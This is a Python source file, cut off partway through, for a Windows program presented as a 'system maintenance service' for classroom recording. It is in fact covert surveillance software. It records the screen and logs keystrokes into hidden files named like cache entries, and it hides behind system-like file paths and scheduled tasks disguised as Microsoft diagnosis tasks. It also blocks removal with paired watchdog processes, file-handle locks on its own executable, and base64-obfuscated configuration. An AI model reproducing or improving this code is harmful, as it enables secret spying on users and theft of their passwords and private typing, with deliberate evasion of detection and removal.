#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
系统维护服务（课堂录制助手）v4.0
- 双进程互防：主进程 + 守护进程，互相持有对方 exe 的文件句柄锁（无法直接删除/重命名）
- 存活互拉：命名 Event 检测对方进程，被杀后 5 秒内由对方重启；任务计划兜底
- 真 H.264 编码（PyAV libx264，约 9MB/小时），cv2 黑帧实测回退
- 全部文件名/路径/任务计划/进程名中性化，规避 Everything 与肉眼排查
- 目标系统：Windows 10 / 11
"""

import sys
import os
import json
import time
import hashlib
import secrets
import stat
import uuid
import shutil
import threading
import ctypes
import subprocess
import base64
from datetime import datetime, timedelta, date

from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                                 QHBoxLayout, QLabel, QPushButton, QFileDialog,
                                 QSystemTrayIcon, QMenu, QCheckBox, QSpinBox,
                                 QGroupBox, QMessageBox, QInputDialog, QLineEdit,
                                 QTreeWidget, QTreeWidgetItem, QHeaderView,
                                 QAbstractItemView, QTextEdit, QScrollArea)
from PySide6.QtCore import Qt, QTimer, QCoreApplication
from PySide6.QtGui import QIcon, QPixmap, QColor, QPainter
from PySide6.QtNetwork import QLocalServer, QLocalSocket

import cv2
import numpy as np
import mss
from pynput import keyboard

try:
    import av  # PyAV：内置FFmpeg，真正的libx264编码，文件极小
    HAS_AV = True
except Exception:
    HAS_AV = False

# ============================================================
# 中性化常量（名称均伪装成系统维护相关，规避搜索）
# ============================================================
APP_EXE_NAME = "sysmaint.exe"            # 主程序/备份/安装包统一文件名
APP_NAME = "系统维护服务"

def _env(name, *fallback):
    v = os.environ.get(name)
    if v:
        return v
    return os.path.join(os.environ.get("USERPROFILE", os.path.expanduser("~")), *fallback)

_LOCAL = os.environ.get("LOCALAPPDATA") or _env("LOCALAPPDATA", "AppData", "Local")

PRIMARY_DIR = os.path.join(_LOCAL, "Programs", "SystemMaintenance")
PRIMARY_EXE = os.path.join(PRIMARY_DIR, APP_EXE_NAME)
BACKUP_DIR = os.path.join(_LOCAL, "Microsoft", "Windows", "Maintenance")
BACKUP_EXE = os.path.join(BACKUP_DIR, APP_EXE_NAME)
CONFIG_DIR = os.path.join(BACKUP_DIR, "config")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.dat")
LOG_FILE = os.path.join(CONFIG_DIR, "svc.log")

FILE_ATTRIBUTE_HIDDEN = 0x2
FILE_ATTRIBUTE_SYSTEM = 0x4
FILE_ATTRIBUTE_NORMAL = 0x80

STORE_DIR_NAME = "cache"     # 视频伪装子目录（看起来像普通缓存）
INDEX_FILE_NAME = "cache.db"

# 任务计划：藏在系统诊断文件夹下，名称像系统维护任务
TASK_AUTO = r"\Microsoft\Windows\Diagnosis\ScheduledMaintenance"
TASK_WATCH = r"\Microsoft\Windows\Diagnosis\MaintenanceWatch"

# 单实例 IPC 与跨进程存活事件（名称中性化）
SOCKET_NAME = "SysMaintSvcIPC"
EVT_MAIN = r"Local\SysMaintSvc_Main_v1"
EVT_GUARD = r"Local\SysMaintSvc_Guard_v1"

# 状态标志文件
PAUSE_FLAG = os.path.join(CONFIG_DIR, "paused.flag")        # 当日停止（17:45或手动退出）
DISABLED_FLAG = os.path.join(CONFIG_DIR, "disabled.flag")   # 永久停用（一键终止），不跨天失效
UNINSTALL_FLAG = os.path.join(CONFIG_DIR, "uninstall.flag")  # 卸载中：所有角色立即退出

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
CREATE_BREAKAWAY_FROM_JOB = 0x01000000
# 完全分离：父进程退出/任务作业结束都不影响自删除脚本
DETACH_FLAGS = (CREATE_NO_WINDOW | DETACHED_PROCESS |
                CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB)
ERROR_ALREADY_EXISTS = 183
SPAWN_COOLDOWN = 25  # 拉起冷却秒数，覆盖 onefile 解压启动期，防止重复拉起
MOVEFILE_DELAY_UNTIL_REBOOT = 0x4  # 登记为重启后由系统删除（需管理员）

DEFAULT_CONFIG = {
    "save_path": "",
    "fps": 5,
    "segment_minutes": 60,
    "stop_hour": 17,
    "stop_minute": 45,
    "autostart": True,
    "scale_width": 1280,
    "hide_tray": False,
    "hide_folder": True,
    "watchdog": False,
    "keylog": False,
    "retention_days": 3,
    "password_hash": "",
    "password_salt": ""
}

_temp_files = []


# ============================================================
# Win32：文件句柄锁 + 跨进程存活事件
# ============================================================
_k32 = ctypes.WinDLL('kernel32', use_last_error=True)
_k32.CreateFileW.restype = ctypes.c_void_p
_k32.CreateEventW.restype = ctypes.c_void_p
_k32.OpenEventW.restype = ctypes.c_void_p
_INVALID_HANDLE = ctypes.c_void_p(-1).value

GENERIC_READ = 0x80000000
FILE_SHARE_READ = 0x00000001   # 只共享“读/执行”，不共享 DELETE/WRITE
OPEN_EXISTING = 3
SYNCHRONIZE = 0x00100000


class FileLock:
    """长期持有目标文件的只读句柄（不共享 DELETE）。
    效果：文件可正常运行/复制，但无法被删除或重命名（winerror 32）。"""

    def __init__(self, path):
        self.path = path
        self.handle = None

    def acquire(self):
        if self.handle:
            return True
        try:
            if not os.path.exists(self.path):
                return False
            h = _k32.CreateFileW(self.path, GENERIC_READ, FILE_SHARE_READ,
                                 None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
            if h and h != _INVALID_HANDLE:
                self.handle = h
                return True
        except Exception:
            pass
        return False

    def release(self):
        if self.handle:
            try:
                _k32.CloseHandle(self.handle)
            except Exception:
                pass
            self.handle = None

    @property
    def locked(self):
        return bool(self.handle)


class AliveEvent:
    """进程存活令牌：持有命名事件，进程退出后事件自动消失。"""

    def __init__(self, name):
        self.name = name
        self.handle = _k32.CreateEventW(None, True, True, name)
        self.already_exists = (ctypes.get_last_error() == ERROR_ALREADY_EXISTS)

    def close(self):
        if self.handle:
            try:
                _k32.CloseHandle(self.handle)
            except Exception:
                pass
            self.handle = None


def event_exists(name):
    """检测某命名事件是否存在（对应进程是否存活）。"""
    try:
        h = _k32.OpenEventW(SYNCHRONIZE, False, name)
        if h:
            _k32.CloseHandle(h)
            return True
    except Exception:
        pass
    return False


def spawn_detached(exe_path, args=None):
    """静默启动子进程，无窗口。"""
    try:
        if not os.path.exists(exe_path):
            return False
        cmd = [exe_path] + (args or [])
        subprocess.Popen(cmd, creationflags=CREATE_NO_WINDOW,
                         close_fds=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return True
    except Exception as e:
        log(f"启动进程失败 {exe_path}: {e}")
        return False


# ============================================================
# 工具函数
# ============================================================
def log(msg):
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 2 * 1024 * 1024:
            try:
                with open(LOG_FILE, 'r', encoding="utf-8") as f:
                    lines = f.readlines()
                with open(LOG_FILE, 'w', encoding="utf-8") as f:
                    f.writelines(lines[-500:])
            except Exception:
                pass
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def _obfuscate(s):
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _deobfuscate(s):
    return base64.b64decode(s.encode("ascii")).decode("utf-8")


def set_hidden_system(path):
    try:
        _k32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
        return True
    except Exception:
        return False


def unset_hidden_system(path):
    try:
        _k32.SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL)
        return True
    except Exception:
        return False


def force_remove(path):
    """删除文件或目录，先清除隐藏/系统/只读属性，失败不抛异常。"""
    try:
        def _onerror(func, p, exc_info):
            try:
                os.chmod(p, stat.S_IWRITE)
                _k32.SetFileAttributesW(p, FILE_ATTRIBUTE_NORMAL)
                func(p)
            except Exception:
                pass
        if os.path.isdir(path) and not os.path.islink(path):
            shutil.rmtree(path, onexc=_onerror)
        elif os.path.exists(path):
            try:
                _k32.SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL)
            except Exception:
                pass
            os.chmod(path, stat.S_IWRITE)
            os.remove(path)
        return True
    except Exception as e:
        log(f"删除失败 {path}: {e}")
        return False


# ============================================================
# 配置管理
# ============================================================
_config_logged = False


def write_pause_flag():
    """记录当日停止（到停止时间或手动退出），守护进程当天不再拉起。"""
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(PAUSE_FLAG, 'w', encoding="utf-8") as f:
            f.write(datetime.now().date().isoformat())
    except Exception:
        pass


def clear_pause_flag():
    try:
        if os.path.exists(PAUSE_FLAG):
            os.remove(PAUSE_FLAG)
    except Exception:
        pass


def pause_active():
    """当天暂停标志是否生效；跨天的旧标志自动清除。"""
    try:
        if os.path.exists(PAUSE_FLAG):
            with open(PAUSE_FLAG, 'r', encoding="utf-8") as f:
                d = f.read().strip()
            if d == datetime.now().date().isoformat():
                return True
            os.remove(PAUSE_FLAG)  # 旧标志，清除
    except Exception:
        pass
    return False


def request_uninstall():
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(UNINSTALL_FLAG, 'w', encoding="utf-8") as f:
            f.write(datetime.now().isoformat())
    except Exception:
        pass


def uninstall_requested():
    return os.path.exists(UNINSTALL_FLAG)


def request_disable():
    """永久停用：守护/静默主进程不再启动，直到用户双击程序恢复。"""
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(DISABLED_FLAG, 'w', encoding="utf-8") as f:
            f.write(datetime.now().isoformat())
    except Exception:
        pass


def clear_disable():
    try:
        if os.path.exists(DISABLED_FLAG):
            os.remove(DISABLED_FLAG)
    except Exception:
        pass


def service_disabled():
    return os.path.exists(DISABLED_FLAG)


def load_config():
    global _config_logged
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding="utf-8") as f:
                raw = f.read().strip()
            cfg = json.loads(_deobfuscate(raw))
            for k, v in DEFAULT_CONFIG.items():
                if k not in cfg:
                    cfg[k] = v
            if not _config_logged:
                log(f"配置加载成功: path={cfg.get('save_path')}, pwd={bool(cfg.get('password_hash'))}")
                _config_logged = True
            return cfg
        except Exception as e:
            log(f"配置加载失败: {e}")
    elif not _config_logged:
        log("配置文件不存在，使用默认配置")
        _config_logged = True
    return DEFAULT_CONFIG.copy()


def save_config(config):
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        data = _obfuscate(json.dumps(config, ensure_ascii=False))
        tmp_file = CONFIG_FILE + ".tmp"
        with open(tmp_file, 'w', encoding="utf-8") as f:
            f.write(data)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_file, CONFIG_FILE)
        return True
    except Exception as e:
        log(f"配置保存失败: {e}")
        return False


# ============================================================
# 密码
# ============================================================
def hash_password(password, salt=None):
    if salt is None:
        salt = secrets.token_hex(16)
    h = hashlib.sha256((salt + password).encode("utf-8")).hexdigest()
    return h, salt


def verify_password(password, stored_hash, salt):
    if not stored_hash or not salt:
        return False
    h, _ = hash_password(password, salt)
    return secrets.compare_digest(h, stored_hash)


def prompt_password(parent=None, title=APP_NAME, label="请输入管理密码："):
    text, ok = QInputDialog.getText(parent, title, label, QLineEdit.Password, "")
    return text, ok


# ============================================================
# 视频伪装存储
# ============================================================
class VideoStore:
    def __init__(self, base_path):
        self.base_path = base_path
        self.store_dir = os.path.join(base_path, STORE_DIR_NAME)
        self.index_file = os.path.join(self.store_dir, INDEX_FILE_NAME)
        os.makedirs(self.store_dir, exist_ok=True)
        set_hidden_system(self.store_dir)
        self.lock = threading.RLock()
        self.index = self._load_index()

    def _load_index(self):
        if os.path.exists(self.index_file):
            try:
                with open(self.index_file, 'r', encoding="utf-8") as f:
                    return json.loads(_deobfuscate(f.read().strip()))
            except Exception:
                pass
        return []

    def _save_index(self):
        try:
            data = _obfuscate(json.dumps(self.index, ensure_ascii=False))
            tmp = self.index_file + ".tmp"
            with open(tmp, 'w', encoding="utf-8") as f:
                f.write(data)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp, self.index_file)
            set_hidden_system(self.index_file)
        except Exception as e:
            log(f"索引保存失败: {e}")

    def _random_name(self):
        return "t" + uuid.uuid4().hex[:10] + ".db"

    def add_video(self, src_path, duration_minutes):
        with self.lock:
            fname = self._random_name()
            dest = os.path.join(self.store_dir, fname)
            try:
                shutil.move(src_path, dest)
            except Exception:
                try:
                    shutil.copy2(src_path, dest)
                    os.remove(src_path)
                except Exception as e:
                    log(f"视频存储失败: {e}")
                    return None
            try:
                set_hidden_system(dest)
            except Exception:
                pass
            size = os.path.getsize(dest) if os.path.exists(dest) else 0
            entry = {
                "file": fname,
                "name": f"录制_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4",
                "size": size,
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "duration": duration_minutes
            }
            self.index.append(entry)
            self._save_index()
            log(f"片段已存储: {fname} ({size // 1024 // 1024}MB)")
            return entry

    def list_videos(self):
        return sorted(self.index, key=lambda x: x.get("time", ""), reverse=True)

    def get_path(self, entry):
        return os.path.join(self.store_dir, entry["file"])

    def delete_video(self, entry):
        with self.lock:
            path = self.get_path(entry)
            try:
                if os.path.exists(path):
                    force_remove(path)
            except Exception as e:
                log(f"删除失败: {e}")
                return False
            try:
                self.index.remove(entry)
            except ValueError:
                self.index = [e for e in self.index if e.get("file") != entry.get("file")]
            self._save_index()
            return True

    def prune(self, cutoff_date):
        """删除录制日期早于/等于 cutoff_date 的片段，并清理不在索引中的孤立分片。
        只动 store_dir 内的 t*.db，绝不触碰配置/密码；返回删除文件数。"""
        removed = 0
        with self.lock:
            kept = []
            referenced = set()
            for e in self.index:
                fn = e.get("file", "")
                referenced.add(fn)
                d = _parse_entry_date(e.get("time", ""))
                if d is not None and d <= cutoff_date:
                    p = os.path.join(self.store_dir, fn)
                    if os.path.exists(p):
                        if force_remove(p):
                            removed += 1
                    else:
                        removed += 1  # 文件已不在，仅清理索引
                else:
                    kept.append(e)
            # 孤立分片（t 开头 .db、不在索引中），按修改时间判定
            try:
                for fn in os.listdir(self.store_dir):
                    if fn.startswith("t") and fn.endswith(".db") and fn not in referenced:
                        p = os.path.join(self.store_dir, fn)
                        try:
                            md = datetime.fromtimestamp(os.path.getmtime(p)).date()
                            if md <= cutoff_date and force_remove(p):
                                removed += 1
                        except Exception:
                            pass
            except Exception:
                pass
            if len(kept) != len(self.index):
                self.index = kept
                self._save_index()
        return removed

    def export_video(self, entry, dest_dir):
        src = self.get_path(entry)
        dest = os.path.join(dest_dir, entry["name"])
        shutil.copy2(src, dest)
        return dest

    def play_video(self, entry):
        src = self.get_path(entry)
        tmp_dir = os.environ.get("TEMP", ".")
        tmp = os.path.join(tmp_dir, entry["name"])
        shutil.copy2(src, tmp)
        _temp_files.append(tmp)
        while len(_temp_files) > 10:
            old = _temp_files.pop(0)
            try:
                os.remove(old)
            except Exception:
                pass
        os.startfile(tmp)
        return tmp


# ============================================================
# 保留期自动清理（只清录制片段与键盘记录，绝不碰配置/密码）
# ============================================================
def _parse_entry_date(s):
    try:
        return datetime.strptime(s, "%Y-%m-%d %H:%M:%S").date()
    except Exception:
        return None


def prune_keylogs(store_dir, cutoff_date):
    """删除日期早于/等于 cutoff_date 的键盘记录 k_YYYYMMDD_HH.db。
    当小时正在写入的文件日期为今天，天然不会命中；返回删除文件数。"""
    removed = 0
    try:
        for fn in os.listdir(store_dir):
            if not (fn.startswith("k_") and fn.endswith(".db")):
                continue
            d = None
            try:
                d = datetime.strptime(fn[2:10], "%Y%m%d").date()
            except Exception:
                try:
                    d = datetime.fromtimestamp(
                        os.path.getmtime(os.path.join(store_dir, fn))).date()
                except Exception:
                    d = None
            if d is not None and d <= cutoff_date:
                if force_remove(os.path.join(store_dir, fn)):
                    removed += 1
    except Exception as e:
        log(f"清理输入记录失败: {e}")
    return removed


def run_retention(config, store):
    """按 retention_days 清理过期片段与键盘记录。返回(片段数, 记录数)。"""
    try:
        days = int(config.get("retention_days", 3))
    except Exception:
        days = 3
    if days < 1:
        return 0, 0
    cutoff = date.today() - timedelta(days=days)
    v = k = 0
    try:
        v = store.prune(cutoff)
        k = prune_keylogs(store.store_dir, cutoff)
        if v or k:
            log(f"自动清理: 删除{days}天前片段 {v} 个、输入记录 {k} 个")
    except Exception as e:
        log(f"自动清理异常: {e}")
    return v, k


# ============================================================
# 自启 / 看门狗任务计划（均启动守护进程，守护再拉起主进程）
# ============================================================
def _guard_cmd():
    return f'"{BACKUP_EXE}" --guard'


def _create_task(name, schedule_args):
    cmd = ['schtasks', '/create', '/tn', name, '/tr', _guard_cmd(),
           '/rl', 'highest', '/f'] + schedule_args
    subprocess.run(cmd, capture_output=True, creationflags=CREATE_NO_WINDOW)


def _delete_task(name):
    subprocess.run(['schtasks', '/delete', '/tn', name, '/f'],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)


def setup_autostart(enable):
    try:
        if enable:
            _create_task(TASK_AUTO, ['/sc', 'onlogon'])
        else:
            _delete_task(TASK_AUTO)
    except Exception as e:
        log(f"自启任务设置失败: {e}")


def setup_watchdog(enable):
    try:
        if enable:
            _create_task(TASK_WATCH, ['/sc', 'minute', '/mo', '1'])
            log("看门狗已启用（每1分钟）")
        else:
            _delete_task(TASK_WATCH)
            log("看门狗已关闭")
    except Exception as e:
        log(f"看门狗设置失败: {e}")


def reconcile_tasks(config):
    """按配置统一校正两个计划任务。
    关键：停用或关闭开机自启时，两个任务（含每分钟看门狗）都必须删除，
    否则看门狗会在重启后变相把程序拉回来。"""
    try:
        auto = bool(config.get("autostart", True)) and not service_disabled()
        setup_autostart(auto)
        setup_watchdog(auto and bool(config.get("watchdog", False)))
    except Exception as e:
        log(f"任务校正失败: {e}")


def kill_all_and_exit():
    """一键终止：结束全部同名进程（守护+主，含自身），标志已先落盘，不会再被拉起。"""
    delayed = ("ping -n 3 127.0.0.1 >nul & taskkill /F /T /IM " + APP_EXE_NAME)
    try:
        subprocess.Popen(['cmd', '/c', delayed], creationflags=DETACH_FLAGS,
                         close_fds=True, stdin=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        subprocess.Popen(['taskkill', '/F', '/T', '/IM', APP_EXE_NAME],
                         creationflags=CREATE_NO_WINDOW, close_fds=True)
    except Exception:
        pass
    QTimer.singleShot(500, lambda: os._exit(0))


def ensure_backup():
    """主进程：确保备份 exe 存在（从自身复制）。"""
    if not getattr(sys, 'frozen', False):
        return
    try:
        os.makedirs(BACKUP_DIR, exist_ok=True)
        current = os.path.normpath(sys.executable)
        if current != os.path.normpath(BACKUP_EXE) and not os.path.exists(BACKUP_EXE):
            shutil.copy2(current, BACKUP_EXE)
            set_hidden_system(BACKUP_DIR)
            set_hidden_system(BACKUP_EXE)
            log(f"已建立备份: {BACKUP_EXE}")
    except Exception as e:
        log(f"备份失败: {e}")


def ensure_primary():
    """守护进程：主 exe 被删则从备份（自身）恢复。"""
    if not getattr(sys, 'frozen', False):
        return False
    try:
        if not os.path.exists(PRIMARY_EXE):
            os.makedirs(PRIMARY_DIR, exist_ok=True)
            cur = os.path.normpath(sys.executable)
            if cur != os.path.normpath(PRIMARY_EXE) and os.path.exists(cur):
                shutil.copy2(cur, PRIMARY_EXE)
                set_hidden_system(PRIMARY_EXE)
                log("主程序被删，已从备份恢复")
                return True
        else:
            return True
    except Exception as e:
        log(f"恢复主程序失败: {e}")
    return os.path.exists(PRIMARY_EXE)


# ============================================================
# 单实例（主进程 IPC）
# ============================================================
def try_connect_existing():
    socket = QLocalSocket()
    socket.connectToServer(SOCKET_NAME)
    if socket.waitForConnected(300):
        return socket
    socket.close()
    return None


# ============================================================
# 录制引擎（PyAV libx264 真H.264，cv2 黑帧实测回退）
# ============================================================
class AvWriter:
    """PyAV libx264，接口对齐 cv2.VideoWriter（write/release/isOpened）。"""

    def __init__(self, path, fps, size, crf=30):
        self._ok = False
        self.container = av.open(path, mode='w')
        w, h = size
        self.w = w - (w % 2)
        self.h = h - (h % 2)
        self.stream = self.container.add_stream('libx264', rate=int(fps))
        self.stream.width = self.w
        self.stream.height = self.h
        self.stream.pix_fmt = 'yuv420p'
        self.stream.options = {'crf': str(crf), 'preset': 'veryfast'}
        self._ok = True

    def isOpened(self):
        return self._ok

    def write(self, frame_bgr):
        try:
            if frame_bgr.shape[1] != self.w or frame_bgr.shape[0] != self.h:
                frame_bgr = cv2.resize(frame_bgr, (self.w, self.h), interpolation=cv2.INTER_AREA)
            vf = av.VideoFrame.from_ndarray(frame_bgr, format='bgr24')
            for packet in self.stream.encode(vf):
                self.container.mux(packet)
        except Exception as e:
            log(f"AvWriter写入失败: {e}")

    def release(self):
        try:
            for packet in self.stream.encode():
                self.container.mux(packet)
        finally:
            self.container.close()


class Recorder:
    def __init__(self, config, video_store, on_status=None, on_file_saved=None):
        self.config = config
        self.video_store = video_store
        self.on_status = on_status
        self.on_file_saved = on_file_saved
        self.running = False
        self.thread = None
        self._sct = None
        self._seg_start = None

    def _emit_status(self, msg):
        if self.on_status:
            QTimer.singleShot(0, lambda: self.on_status(msg))

    def _emit_file(self, entry):
        if self.on_file_saved and entry:
            QTimer.singleShot(0, lambda: self.on_file_saved(entry))

    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        log("录制服务已启动")
        self._emit_status("运行中")

    def stop(self):
        if not self.running:
            return
        self.running = False
        if self.thread:
            self.thread.join(timeout=10)
        log("录制服务已停止")
        self._emit_status("已停止")

    def _is_stop_time(self):
        now = datetime.now()
        return (now.hour > self.config["stop_hour"] or
                (now.hour == self.config["stop_hour"] and now.minute >= self.config["stop_minute"]))

    def _create_writer(self, filepath, fps, size):
        """PyAV 优先；cv2 回退必须黑帧实测，剔除 isOpened 假成功的编码器。"""
        w, h = size
        w -= w % 2
        h -= h % 2
        size = (w, h)

        if HAS_AV:
            try:
                fp = os.path.splitext(filepath)[0] + ".mp4"
                writer = AvWriter(fp, fps, size, crf=30)
                if writer.isOpened():
                    log("编码器: libx264(H.264)")
                    return writer, fp
            except Exception as e:
                log(f"PyAV编码器失败: {e}")

        for fourcc_str, ext in [('mp4v', '.mp4'), ('XVID', '.avi'), ('MJPG', '.avi')]:
            tested = self._test_cv2_codec(fourcc_str, ext, fps, size)
            if tested:
                try:
                    os.remove(tested)
                except Exception:
                    pass
                fp = os.path.splitext(filepath)[0] + ext
                fourcc = cv2.VideoWriter_fourcc(*fourcc_str)
                writer = cv2.VideoWriter(fp, fourcc, fps, size)
                if writer.isOpened():
                    log(f"编码器: cv2 {fourcc_str}（回退）")
                    return writer, fp
        log("错误：所有编码器均失败")
        return None, filepath

    def _test_cv2_codec(self, fourcc_str, ext, fps, size):
        tmp_dir = os.environ.get("TEMP", ".")
        tmp = os.path.join(tmp_dir, "enctest_" + uuid.uuid4().hex[:6] + ext)
        try:
            fourcc = cv2.VideoWriter_fourcc(*fourcc_str)
            tw = cv2.VideoWriter(tmp, fourcc, fps, size)
            if not tw.isOpened():
                tw.release()
                return None
            black = np.zeros((size[1], size[0], 3), dtype=np.uint8)
            for _ in range(10):
                tw.write(black)
            tw.release()
            if not os.path.exists(tmp) or os.path.getsize(tmp) < 1024:
                return None
            sz = os.path.getsize(tmp)
            threshold = size[0] * size[1] * 10 * 0.05
            if sz > threshold:
                log(f"编码器 {fourcc_str} 实测异常({sz // 1024}KB)，判为假成功弃用")
                try:
                    os.remove(tmp)
                except Exception:
                    pass
                return None
            return tmp
        except Exception:
            return None

    def _loop(self):
        save_path = self.config["save_path"]
        fps = self.config["fps"]
        seg_sec = self.config["segment_minutes"] * 60
        scale_w = self.config.get("scale_width", 1280)

        self._sct = mss.mss()
        try:
            monitor = self._sct.monitors[1]
            orig_w, orig_h = monitor["width"], monitor["height"]

            if 0 < scale_w < orig_w:
                out_w, out_h = scale_w, int(orig_h * scale_w / orig_w)
            else:
                out_w, out_h = orig_w, orig_h
            out_w -= out_w % 2
            out_h -= out_h % 2

            log(f"录制参数: {out_w}x{out_h}, {fps}fps")
            frame_interval = 1.0 / fps
            tmp_dir = os.environ.get("TEMP", ".")

            while self.running:
                if self._is_stop_time():
                    self.running = False
                    self._emit_status("已到停止时间")
                    break

                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                        ctypes.c_wchar_p(save_path[:2]), None, None, ctypes.pointer(free_bytes))
                    if free_bytes.value < 500 * 1024 * 1024:
                        self._emit_status("磁盘空间不足")
                        break
                except Exception:
                    pass

                self._seg_start = time.time()
                tmp_file = os.path.join(tmp_dir, "svc_" + uuid.uuid4().hex[:8] + ".mp4")
                writer, actual_path = self._create_writer(tmp_file, fps, (out_w, out_h))
                if writer is None:
                    log("无法创建编码器，5秒后重试")
                    time.sleep(5)
                    continue
                seg_end = time.time() + seg_sec

                while self.running and time.time() < seg_end:
                    t0 = time.time()
                    if self._is_stop_time():
                        break
                    try:
                        img = self._sct.grab(monitor)
                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                        if out_w != orig_w:
                            frame = cv2.resize(frame, (out_w, out_h), interpolation=cv2.INTER_AREA)
                        writer.write(frame)
                    except Exception:
                        pass
                    dt = time.time() - t0
                    if dt < frame_interval:
                        time.sleep(frame_interval - dt)

                writer.release()
                if os.path.exists(actual_path) and os.path.getsize(actual_path) > 1024:
                    duration = round((time.time() - self._seg_start) / 60, 1)
                    entry = self.video_store.add_video(actual_path, duration)
                    self._emit_file(entry)
                else:
                    try:
                        os.remove(actual_path)
                    except Exception:
                        pass
        finally:
            if self._sct:
                try:
                    self._sct.close()
                except Exception:
                    pass


# ============================================================
# 键盘记录器
# ============================================================
SPECIAL_KEY_MAP = {
    'Key.enter': '[Enter]', 'Key.space': '[Space]', 'Key.backspace': '[Backspace]',
    'Key.tab': '[Tab]', 'Key.esc': '[Esc]', 'Key.shift': '[Shift]',
    'Key.shift_r': '[Shift_R]', 'Key.ctrl': '[Ctrl]', 'Key.ctrl_r': '[Ctrl_R]',
    'Key.alt': '[Alt]', 'Key.alt_r': '[Alt_R]', 'Key.cmd': '[Win]',
    'Key.cmd_r': '[Win_R]', 'Key.up': '[Up]', 'Key.down': '[Down]',
    'Key.left': '[Left]', 'Key.right': '[Right]', 'Key.home': '[Home]',
    'Key.end': '[End]', 'Key.page_up': '[PageUp]', 'Key.page_down': '[PageDown]',
    'Key.insert': '[Insert]', 'Key.delete': '[Delete]', 'Key.caps_lock': '[CapsLock]',
    'Key.num_lock': '[NumLock]', 'Key.scroll_lock': '[ScrollLock]', 'Key.pause': '[Pause]',
    'Key.print_screen': '[PrintScreen]', 'Key.menu': '[Menu]',
}
MODIFIER_KEYS = {'Key.shift', 'Key.shift_r', 'Key.ctrl', 'Key.ctrl_r',
                  'Key.alt', 'Key.alt_r', 'Key.cmd', 'Key.cmd_r'}
MODIFIER_DISPLAY = {
    'Key.shift': 'Shift', 'Key.shift_r': 'Shift',
    'Key.ctrl': 'Ctrl', 'Key.ctrl_r': 'Ctrl',
    'Key.alt': 'Alt', 'Key.alt_r': 'Alt',
    'Key.cmd': 'Win', 'Key.cmd_r': 'Win',
}


class KeyboardLogger:
    CHAR_GAP_SECONDS = 2.0

    def __init__(self, store_dir):
        self.store_dir = store_dir
        self.listener = None
        self.running = False
        self.buffer = []
        self.active_modifiers = set()
        self.current_file_path = None
        self.current_hour = None
        self.char_buffer = []
        self.last_char_time = 0
        self._idle_thread = None
        self._lock = threading.RLock()

    def start(self):
        if self.running:
            return
        self.running = True
        try:
            self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
            self.listener.start()
            self._idle_thread = threading.Thread(target=self._idle_flush_loop, daemon=True)
            self._idle_thread.start()
            log("输入记录已启动")
        except Exception as e:
            log(f"输入记录启动失败: {e}")
            self.running = False

    def stop(self):
        self.running = False
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
        self._flush_char_buffer()
        self._flush()

    def _idle_flush_loop(self):
        while self.running:
            time.sleep(1)
            try:
                with self._lock:
                    need = bool(self.char_buffer and
                                (time.time() - self.last_char_time) > self.CHAR_GAP_SECONDS)
                if need:
                    self._flush_char_buffer()
            except Exception:
                pass

    def _key_to_str(self, key):
        try:
            ch = key.char
            if ch:
                return ch
        except AttributeError:
            pass
        return SPECIAL_KEY_MAP.get(str(key), str(key))

    def _flush_char_buffer(self):
        with self._lock:
            if not self.char_buffer:
                return
            text = "".join(self.char_buffer)
            self.char_buffer = []
        if text.strip():
            self._write("连续输入", text)

    def _on_press(self, key):
        if not self.running:
            return
        key_str = str(key)
        try:
            char = key.char
            is_char = True
        except AttributeError:
            is_char = False

        if key_str in MODIFIER_KEYS:
            self._flush_char_buffer()
            self.active_modifiers.add(key_str)
            self._write("修饰键", self._key_to_str(key))
            return

        active = [MODIFIER_DISPLAY.get(m, m) for m in sorted(self.active_modifiers)]
        if active:
            self._flush_char_buffer()
            key_display = self._key_to_str(key).strip('[]')
            self._write("组合键", "+".join(active + [key_display]))
            return

        if key_str == 'Key.backspace':
            with self._lock:
                if self.char_buffer:
                    self.char_buffer.pop()
                    self.last_char_time = time.time()
            return

        if not is_char:
            self._flush_char_buffer()
            self._write("按键", self._key_to_str(key))
            return

        now = time.time()
        with self._lock:
            if self.char_buffer and (now - self.last_char_time) > self.CHAR_GAP_SECONDS:
                self._flush_char_buffer()
            self.char_buffer.append(char)
            self.last_char_time = now

    def _on_release(self, key):
        if str(key) in self.active_modifiers:
            self.active_modifiers.discard(str(key))

    def _write(self, event_type, content):
